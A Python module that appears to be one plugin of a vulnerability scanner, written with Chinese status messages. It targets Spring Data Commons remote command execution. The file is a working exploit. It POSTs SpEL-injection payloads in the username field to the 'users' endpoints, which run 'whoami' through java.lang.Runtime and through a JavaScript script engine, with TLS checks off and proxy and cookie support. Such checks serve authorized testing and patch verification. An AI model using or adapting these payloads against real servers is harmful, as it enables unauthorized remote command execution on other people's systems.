import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        Headers_1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        payload_1 = "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")]=chybeta&password=chybeta&repeatedPassword=chybeta"
        payload_2 = "username[#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('whoami')\")]=asdf"
        path1 = 'users'
        path2 = 'users?page=0&size=5'
        logging.captureWarnings(True)
        aa1 = requests.post(url1 + path1, cookies=s_cookie,headers=Headers_1,data=payload_1,proxies=proxies, verify=False, timeout=5)
        aa2 = requests.post(url1 + path2, cookies=s_cookie,headers=Headers_1,data=payload_2,proxies=proxies, verify=False, timeout=5)
        if aa1.status_code==200 and 'Users' in aa1.text:
            cdd='[+]漏洞存在\n'+str(aa1.text)
        elif aa2.status_code==200 and 'Users' in aa2.text:
            cdd='[+]漏洞存在\n'+str(aa2.text)
        else:
            cdd='[-]漏洞不存在\n'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ Spring Data_Commons远程命令执行 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)